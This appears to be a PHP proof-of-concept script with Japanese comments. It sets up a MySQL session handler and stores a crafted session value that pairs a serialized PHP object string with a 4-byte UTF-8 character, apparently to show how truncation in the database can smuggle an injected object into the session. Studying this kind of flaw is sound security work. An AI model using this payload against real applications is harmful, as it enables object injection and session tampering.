<?php
// データベースセッションクラスのインスタンス作成
require_once 'MysqlSessionHandler.php';
$handler = new MysqlSessionHandler();
// クラスを設定
session_set_save_handler(
    array($handler, 'open'),
    array($handler, 'close'),
    array($handler, 'read'),
    array($handler, 'write'),
    array($handler, 'destroy'),
    array($handler, 'gc')
);
// シャットダウンする際にセッション情報を書き込んでクローズ
register_shutdown_function('session_write_close');
// セッション開始
session_start();

var_dump($_SESSION);
echo session_encode();

// mysql> create table session (id varchar(100) NOT NULL, data longtext, created datetime default null, primary key (id)) engine=innoDB;
// セッションに情報を設定
//$_SESSION['abc'] = 'def';
//$_SESSION['ghi'] = 'jkl';
$utf4byte = "\xF0\xA0\x80\x8B";
$injection = '_aa|O:6:"Class1":1:{s:15:"%00Class1%00private";s:3:"prv";}';
$_SESSION['_inject']['browser'] = $injection . $utf4byte;

var_dump($_SESSION);
echo "<br>";
echo session_encode();

?>
<br>
<a href="next.php">next</a>
